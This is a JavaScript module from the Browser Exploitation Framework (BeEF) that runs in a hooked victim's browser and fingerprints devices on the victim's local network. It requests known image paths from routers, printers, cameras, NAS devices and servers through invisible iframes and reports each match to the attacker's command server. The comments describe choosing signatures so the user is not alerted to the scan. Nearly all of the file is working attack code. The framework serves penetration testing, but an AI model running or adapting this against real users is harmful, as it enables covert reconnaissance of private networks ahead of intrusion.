//
// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  var ips = new Array();
  var ipRange = "<%= @ipRange %>";
  var ports   = "<%= @ports %>";
  var timeout = "<%= @timeout %>";
  var wait = "<%= @wait %>";
  var threads = "<%= @threads %>";

  if (ports != null) {
    ports = ports.split(',');
  }

  // set target IP addresses
  if (ipRange == 'common') {
    // use default IPs
    ips = [
      '192.168.0.1',
      '192.168.0.100',
      '192.168.0.254',
      '192.168.1.1',
      '192.168.1.100',
      '192.168.1.254',
      '10.0.0.1',
      '10.1.1.1',
      '192.168.2.1',
      '192.168.2.254',
      '192.168.100.1',
      '192.168.100.254',
      '192.168.123.1',
      '192.168.123.254',
      '192.168.10.1',
      '192.168.10.254'
    ];
  } else {
    // set target IP range
    var range = ipRange.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
    if (range == null || range[1] == null) {
      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied");
      return;
    }
    // ipRange will be in the form of 192.168.0.1-192.168.0.254
    // the fourth octet will be iterated.
    // (only C class IP ranges are supported atm)
    ipBounds   = ipRange.split('-');
    lowerBound = ipBounds[0].split('.')[3];
    upperBound = ipBounds[1].split('.')[3];
    for (i=lowerBound;i<=upperBound;i++){
      ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i;
      ips.push(ipToTest);
    }
  }

  /* Signatures in the form of:
     "Dev/App Name", -- string
     "Default Port", -- string
     "Protocol",     -- string -- http/https
     "Use Multiple Ports if specified", -- boolean
     "IMG path",     -- string -- file URI path
     "IMG width",    -- integer
     "IMG height"    -- integer

    When adding new signatures, try to find images which:
     * have a unique URI and width/height combination
     * use a valid SSL certificate - invalid certs prevent the resouce from loading
     * do not require HTTP authentication - auth popups may alert the user to the scan
   */
  var urls = new Array(
  new Array(
    "Apache",
    "80","http",false,
    "/icons/apache_pb.gif",259,32),
  new Array(
    "Apache 2.x",
    "80","http",false,
    "/icons/apache_pb2.gif",259,32),
  new Array(
    "Microsoft IIS 7.x",
    "80","http",false,
    "/welcome.png",571,411),
  new Array(
    "Microsoft IIS",
    "80","http",false,
    "/pagerror.gif",36,48),
  new Array(
    "PHP",
    "80","http",false,
    "/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",120,67),
  new Array(
    "QNAP NAS",
    "8080","http",false,
    "/ajax_obj/img/running.gif",16,16),
  new Array(
    "QNAP NAS",
    "443","https",false,
    "/cgi-bin/images/login/cloud_portal.png",165,32),
  new Array(
    "Asus RT Series Router",
    "80","http",false,
    "/images/top-02.gif",359,78),
  new Array(
    "Asus RX Series Router",
    "80","http",false,
    "/images/bu_blue.gif",82,16),
  new Array(
    "Belkin Router",
    "80","http",false,
    "/images/title_2.gif",321,28),
  new Array(
    "Billion Router",
    "80","http",false,
    "/customized/logo.gif",318,69),
  new Array(
    "Billion Router",
    "80","http",false,
    "/customized/logo.gif",224,55),
  new Array(
    "Netgear N300 Router",
    "80","http",false,
    "/settings.gif",750,85),
  new Array(
    "Linksys NAS",
    "80","http",false,
    "/Admin_top.JPG",750,52),
  new Array(
    "Linksys NAS",
    "80","http",false,
    "/logo.jpg",194,52),
  new Array(
    "D-Link DCS Camera",
    "80","http",false,
    "/devmodel.jpg",127,27),
  new Array(
    "Linksys Network Camera",
    "80","http",false,
    "/welcome.jpg",146,250),
  new Array(
    "Linksys Wireless-G Camera",
    "80","http",false,
    "/header.gif",750,97),
  new Array(
    "Cisco IP Phone",
    "80","http",false,
    "/Images/Logo",120,66),
  new Array(
    "Snom Phone",
    "80","http",false,
    "/img/snom_logo.png",168,62),
  new Array(
    "Dell Laser Printer",
    "80","http",false,
    "/ews/images/delllogo.gif",100,100),
  new Array(
    "Brother Printer",
    "80","http",false,
    "/pbio/brother.gif",144,52),
  new Array(
    "HP LaserJet Printer",
    "80","http",false,
    "/hp/device/images/logo.gif",42,27),
  new Array(
    "HP LaserJet Printer",
    "80","http",false,
    "/hp/device/images/hp_invent_logo.gif",160,52),
  new Array(
    "JBoss Application server",
    "8080","http",true,
    "/images/logo.gif",226,105),
  new Array(
    "APC InfraStruXure Manager",
    "80","http",false,
    "/images/Xlogo_Layer-1.gif",342,327),
  new Array(
    "Barracuda Spam/Virus Firewall",
    "8000","http",true,
    "/images/powered_by.gif",211,26),
  new Array(
    "TwonkyMedia Server",
    "9000","http",false,
    "/images/TwonkyMediaServer_logo.jpg",150,82),
  new Array(
    "VMware ESXi Server",
    "80","http",false,
    "/background.jpeg",1,1100),
  new Array(
    "Microsoft Remote Web Workplace",
    "80","http",false,
    "/Remote/images/submit.gif",31,31),
  new Array(
    "XAMPP",
    "80","http",false,
    "/xampp/img/xampp-logo-new.gif",200,59),
  new Array(
    "Xerox Printer",
    "80","http",false,
    "/printbut.gif",30,30),
  new Array(
    "Konica Minolta Printer",
    "80","http",false,
    "/G27_light.gif",206,26),
  new Array(
    "Epson Printer",
    "80","http",false,
    "/cyandot.gif",1,1),
  new Array(
    "HP Printer",
    "80","http",false,
    "/hp/device/images/hp_invent_logo.gif",160,52),
  new Array(
    "HP Printer Photosmart series",
    "80","http",false,
    "/webApps/images/hp_d_rgb_m.gif",50,50),
  new Array(
    "Lexmark Printer",
    "80","http",false,
    "/images/lexlogo.gif",153,115),
  new Array(
    "Canon Printer",
    "8000","http",false,
    "/login/image/canonlogo.gif",100,37),
  new Array(
    "Zenoss",
    "8080","http",false,
    "/zport/dmd/favicon.ico",16,16),
  new Array(
    "Wordpress",
    "80","http",true,
    "/wp-includes/images/wpmini-blue.png",16,16),
  new Array(
    "Glassfish Server",
    "4848","http",false,
    "/theme/com/sun/webui/jsf/suntheme/images/login/gradlogsides.jpg", 1, 200),
  new Array(
    "pfSense",
    "443","https",false,
    "/themes/pfsense_ng/images/logo.gif",200,56),
  new Array(
    "Apache Tomcat",
    "8080","http",true,
    "/docs/images/tomcat.gif",146,92),
  new Array(
    "Jenkins",
    "80","http",false,
    "/static/"+Math.random().toString(36).substring(2,10)+"/images/jenkins.png",240,323),
  new Array(
    "SAP NetWeaver",
    "80","http",true,
    "/logon/layout/shadow.jpg",18,4),
  new Array(
    "Netscape iPlanet",
    "80","http",true,
    "/mc-icons/menu.gif",21,18),
  new Array("Kemp Load Master", "443", "https", false, "/kemplogo.png",951,75),
  new Array(
    "m0n0wall",
    "80","http",false,
    "/logo.gif",150,47),
  new Array("SMC Router","80","http",false,"/images/logo.gif",133,59),
  new Array("ntop","3000","http",false,"/ntop_logo.png",103,50)

// Uncommon signatures
//new Array("Rejetto HttpFileServer", "8080", "http",i true, "/~img27",16,16),
//new Array("Citrix MetaFrame", "80", "http", false, "/Citrix/MetaFrameXP/default/media/nfusehead.gif",230,41),
//new Array("Oracle E-Business Suite","80","http",false,"/OA_MEDIA/FNDSSCORP.gif",134,31),
//new Array("OracleAS Reports Service","80","http",false,"/reports/images/oraclelogo_sizewithprodbrand.gif",133,20),
//new Array("Oracle iLearning","80","http",false,"/ilearn/en/shared/img/coin_help_ready.gif",60,32),
//new Array("RSA Self-Service Console", "80", "http",false,"/console-selfservice/images/default/icn_help.gif",14,14),
//new Array("Sambar Server", "80", "http",false,"/sysimage/system/powerby.gif",41,23),
//new Array("BeEF","3000","http",false,"/ui/media/images/beef.png",200,149),
//new Array("BeEF (PHP)","80","http",false,"/beef/images/beef.gif",32,32),
//new Array("Siemens Simatic","80",false,"/Images/Siemens_Firmenmarke.gif",115,76),
//new Array("Alt-N MDaemon World Client","3000","http",false,"/LookOut/biglogo.gif",342,98),
//new Array("VLC Media Player","8080","http",false,"/images/white_cross_small.png",9,9),
//new Array("Syncrify","5800","http",false,"/images/468x60.gif",468,60),
//new Array("Winamp Web Interface","80","http",false,"/img?image=121",30,30),
  );

  checkSignature = function(signature_id, signature_name, proto, ip, port, uri) {
    var img = new Image;
    var dom = beef.dom.createInvisibleIframe();
    dom.setAttribute('id', 'lan_<%= @command_id %>_'+signature_id+'_'+proto+'_'+ip);
    beef.debug("[Network Fingerprint] Checking for [" + signature_name + "] at IP [" + ip + "] (" + proto + ")");
    img.id  = signature_id;
    img.src = proto+"://"+ip+":"+port+uri;
    img.onerror = function() { dom.removeChild(this); }
    img.onload = function() {
      if (this.width == urls[this.id][5] && this.height == urls[this.id][6]) {
        beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+'&discovered='+signature_name+"&url="+escape(this.src));dom.removeChild(this);
        beef.debug("[Network Fingerprint] Found [" + signature_name + "] with URL [" + escape(this.src) + "]");
      }
    }
    dom.appendChild(img);
    // stop & remove iframe
    setTimeout(function() {
      if (dom.contentWindow.stop !== undefined) {
        dom.contentWindow.stop();
      } else if (dom.contentWindow.document.execCommand !== undefined) {
        dom.contentWindow.document.execCommand("Stop", false);
      }
      document.body.removeChild(dom);
    }, timeout*1000);
  }

  WorkerQueue = function(frequency) {

    var stack = [];
    var timer = null;
    var frequency = frequency;
    var start_scan = (new Date).getTime();

    this.process = function() {
      var item = stack.shift();
      eval(item);
      if (stack.length === 0) {
        clearInterval(timer);
        timer = null;
        var interval = (new Date).getTime() - start_scan;
        beef.debug("[Network Fingerprint] Worker queue is complete ["+interval+" ms]");
        return;
      }
    }

    this.queue = function(item) {
      stack.push(item);
      if (timer === null) {
        timer = setInterval(this.process, frequency);
      }
    }

  }

  // create worker queue
  var workers = new Array();
  for (w=0; w < threads; w++) {
    workers.push(new WorkerQueue(wait*1000));
  }

  // for each URI signature
  for (var u=0; u < urls.length; u++) {
    var worker = workers[u % threads];
    // for each LAN IP address
    for (var i=0; i < ips.length; i++) {
      if (!urls[u][3]) {
        // use default port
        worker.queue('checkSignature("'+u+'","'+urls[u][0]+'","'+urls[u][2]+'","'+ips[i]+'","'+urls[u][1]+'","'+urls[u][4]+'");');
      } else {
        // iterate through all the specified ports
        for (var p=0; p < ports.length; p++) {
          worker.queue('checkSignature("'+u+'","'+urls[u][0]+'","'+urls[u][2]+'","'+ips[i]+'","'+ports[p]+'","'+urls[u][4]+'");');
        }
      }
    }
  }

});

